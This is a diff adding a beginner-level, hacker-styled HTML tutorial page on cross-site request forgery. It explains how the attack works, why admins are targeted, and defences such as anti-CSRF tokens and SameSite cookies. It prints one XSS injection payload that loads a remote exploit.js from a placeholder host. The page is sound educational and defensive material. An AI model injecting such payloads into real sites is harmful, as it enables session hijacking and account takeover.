@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF: The Ghost in the Session</title>
+    <style>
+        /* === CORE HACKER THEME === */
+        :root {
+            --bg-color: #050505;
+            --neon-green: #00ff33;
+            --neon-cyan: #00e5ff;
+            --neon-red: #ff003c;
+            --neon-warning: #ffcc00;
+            --font-main: 'Courier New', Courier, monospace;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--neon-green);
+            font-family: var(--font-main);
+            margin: 0;
+            padding: 20px;
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        /* === TYPOGRAPHY & GLITCH EFFECTS === */
+        h1, h2, h3 {
+            color: var(--neon-warning);
+            text-transform: uppercase;
+            border-bottom: 1px solid var(--neon-warning);
+            padding-bottom: 5px;
+            margin-top: 40px;
+        }
+
+        .ascii-art {
+            white-space: pre;
+            color: var(--neon-warning);
+            text-shadow: 0 0 5px var(--neon-warning);
+            text-align: center;
+            font-size: clamp(6px, 1vw, 14px);
+            margin-bottom: 30px;
+        }
+
+        .glitch {
+            position: relative;
+            display: inline-block;
+        }
+
+        .glitch::before, .glitch::after {
+            content: attr(data-text);
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: var(--bg-color);
+        }
+
+        .glitch::before {
+            left: 2px;
+            text-shadow: -1px 0 var(--neon-red);
+            clip: rect(24px, 550px, 90px, 0);
+            animation: glitch-anim-2 3s infinite linear alternate-reverse;
+        }
+
+        .glitch::after {
+            left: -2px;
+            text-shadow: -1px 0 var(--neon-cyan);
+            clip: rect(85px, 550px, 140px, 0);
+            animation: glitch-anim 2.5s infinite linear alternate-reverse;
+        }
+
+        @keyframes glitch-anim {
+            0% { clip: rect(10px, 9999px, 44px, 0); }
+            20% { clip: rect(80px, 9999px, 90px, 0); }
+            40% { clip: rect(20px, 9999px, 30px, 0); }
+            60% { clip: rect(60px, 9999px, 70px, 0); }
+            80% { clip: rect(5px, 9999px, 15px, 0); }
+            100% { clip: rect(40px, 9999px, 50px, 0); }
+        }
+
+        @keyframes glitch-anim-2 {
+            0% { clip: rect(65px, 9999px, 100px, 0); }
+            20% { clip: rect(10px, 9999px, 30px, 0); }
+            40% { clip: rect(45px, 9999px, 60px, 0); }
+            60% { clip: rect(85px, 9999px, 95px, 0); }
+            80% { clip: rect(20px, 9999px, 40px, 0); }
+            100% { clip: rect(50px, 9999px, 70px, 0); }
+        }
+
+        /* === LAYOUT & CONTAINERS === */
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            border: 1px solid var(--neon-warning);
+            padding: 30px;
+            box-shadow: 0 0 20px rgba(255, 204, 0, 0.15) inset;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(255, 204, 0, 0.02) 0px,
+                rgba(255, 204, 0, 0.02) 1px,
+                transparent 1px,
+                transparent 2px
+            );
+        }
+
+        .terminal-header {
+            display: flex;
+            justify-content: space-between;
+            border-bottom: 2px dashed var(--neon-warning);
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+            font-size: 0.9em;
+            color: var(--neon-warning);
+        }
+
+        .highlight-warning { color: var(--neon-warning); font-weight: bold; }
+        .highlight-cyan { color: var(--neon-cyan); font-weight: bold; }
+        .highlight-red { color: var(--neon-red); font-weight: bold; }
+
+        .box {
+            border: 1px solid var(--neon-red);
+            padding: 20px;
+            margin: 20px 0;
+            background: rgba(255, 0, 60, 0.05);
+            border-left: 5px solid var(--neon-red);
+        }
+
+        pre {
+            background-color: #080808;
+            color: #fff;
+            padding: 15px;
+            border: 1px solid #333;
+            overflow-x: auto;
+            border-left: 3px solid var(--neon-warning);
+            font-size: 1em;
+        }
+
+        code {
+            color: var(--neon-cyan);
+            font-weight: bold;
+        }
+
+        .table-container {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+
+        .table-container th, .table-container td {
+            border: 1px solid var(--neon-warning);
+            padding: 12px;
+            text-align: left;
+        }
+
+        .table-container th {
+            color: var(--bg-color);
+            background-color: var(--neon-warning);
+            text-transform: uppercase;
+        }
+
+        .diagram-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 30px 0;
+            font-family: monospace;
+            white-space: pre;
+            background: #0a0a0a;
+            padding: 20px;
+            border: 1px dashed var(--neon-warning);
+            color: var(--neon-green);
+            overflow-x: auto;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="terminal-header">
+        <span>SECURITY.LOG: CSRF_VULNERABILITY</span>
+        <span class="glitch" data-text="THREAT_VULN: UNFILTERED_INPUT">THREAT_VULN: UNFILTERED_INPUT</span>
+    </div>
+
+    <div class="ascii-art">
+   ____ ____  ____  _____ 
+  / ___/ ___||  _ \|  ___|
+ | |   \___ \| |_) | |_   
+ | |___ ___) |  _ <|  _|  
+  \____|____/|_| \_\_|    
+    </div>
+
+    <!-- ==========================================
+         SECTION 1: PLAIN ENGLISH REWRITE
+         ========================================== -->
+    <h2 class="glitch" data-text="> 01_THE_UNWANTED_REQUEST">> 01_THE_UNWANTED_REQUEST</h2>
+    
+    <p><span class="highlight-warning">Cross-Site Request Forgery (CSRF)</span> is a trick where a hacker makes your browser perform an action on a website without you knowing. Imagine you are logged into your bank. You visit a hacker's "malicious" site in another tab. That site contains a hidden command that tells your browser: "Tell the bank to send $1000 to the hacker." Because you are already logged in, the bank thinks <span class="highlight-cyan">you</span> sent the command!</p>
+
+    <p>This attack often uses <span class="highlight-red">XSS</span> to work. A hacker might post a comment on a forum that contains a hidden script. When you read that comment, the script automatically sends a request to change your password to something the hacker knows. Suddenly, you are locked out, and the hacker is in.</p>
+
+    <div class="box">
+        <h3 style="margin-top:0;">> THE_ADMIN_TRAP</h3>
+        <p>Hackers love targeting administrators with CSRF. Since admins have the "keys to the kingdom," tricking an admin's browser into deleting a user, changing a site setting, or granting the hacker admin powers can lead to a total server takeover.</p>
+    </div>
+
+    <!-- ==========================================
+         SECTION 2: ATTACK & DEFENSE STRATEGY
+         ========================================== -->
+    <h2 class="glitch" data-text="> 02_HOW_THEY_ATTACK">> 02_HOW_THEY_ATTACK</h2>
+    <p>Instead of a simple alert, a hacker might load a remote script to do the dirty work:</p>
+
+    <pre>"><script src=//www.example.com/exploit.js></script></pre>
+
+    <p>The <code>exploit.js</code> file is a custom-made tool that knows exactly how the target website works. It automatically fills out forms (like the "Change Password" form) and clicks "Submit" in the background before you even realize anything happened.</p>
+
+    <h2 class="glitch" data-text="> 03_THE_DEFENSE_PROTOCOL">> 03_THE_DEFENSE_PROTOCOL</h2>
+    <p>To stop these attacks, developers must build "Security by Design." There are two main ways to handle user input:</p>
+    
+    <table class="table-container">
+        <tr>
+            <th>Control</th>
+            <th>The Hacker-Proof Explanation</th>
+        </tr>
+        <tr>
+            <td><span class="highlight-cyan">Sanitization</span></td>
+            <td>Cleaning the input. If a user types <code>&lt;script&gt;</code>, the cleaner turns it into plain text so it can't run.</td>
+        </tr>
+        <tr>
+            <td><span class="highlight-cyan">Validation</span></td>
+            <td>Checking the format. If a box asks for an Email, the site should reject anything that doesn't look like <code>user@example.com</code>.</td>
+        </tr>
+    </table>
+
+    <div class="box" style="border-color: var(--neon-cyan); background: rgba(0, 229, 255, 0.05);">
+        <h3 style="margin-top:0; color: var(--neon-cyan);">> MODERN_SHIELDS</h3>
+        <ul>
+            <li><span class="highlight-warning">Anti-CSRF Tokens:</span> A secret, one-time code added to every request. If the code is missing or wrong, the server rejects the request.</li>
+            <li><span class="highlight-warning">SameSite Cookies:</span> A setting that tells the browser: "Don't send my login session to other websites."</li>
+            <li><span class="highlight-warning">Password Confirmation:</span> Forcing users to type their old password before setting a new one stops CSRF dead in its tracks.</li>
+        </ul>
+    </div>
+
+    <!-- ==========================================
+         SECTION 4: FINAL SYSTEM ARCHITECTURE
+         ========================================== -->
+    <h2 class="glitch" data-text="> 04_SECURITY_BY_DESIGN">> 04_SECURITY_BY_DESIGN</h2>
+    
+    <div class="diagram-container">
+[ THE HACKER ] ----> [ MALICIOUS LINK/COMMENT ]
+                             |
+                             v
+[ THE VICTIM ] <---- [ TRUSTED WEBSITE ]
+(Authenticated)              |
+                             | (Browser is tricked)
+                             v
+[ UNAUTHORIZED ACTION ] (e.g., Change Password)
+                             |
+                             v
+[ DEFENSE: CSRF TOKEN ] <--- [ BLOCKS REQUEST ]
+(Request lacks valid token, hacker fails!)
+    </div>
+
+    <div class="terminal-header" style="margin-top: 40px; border-top: 2px dashed var(--neon-warning); border-bottom: none; padding-top: 10px;">
+        <span>SYSTEM.STATUS: FULL_CURRICULUM_ARCHIVED</span>
+        <span>KNOWLEDGE_IS_POWER_STAY_SECURE_</span>
+    </div>
+</div>
+
+</body>
+</html>
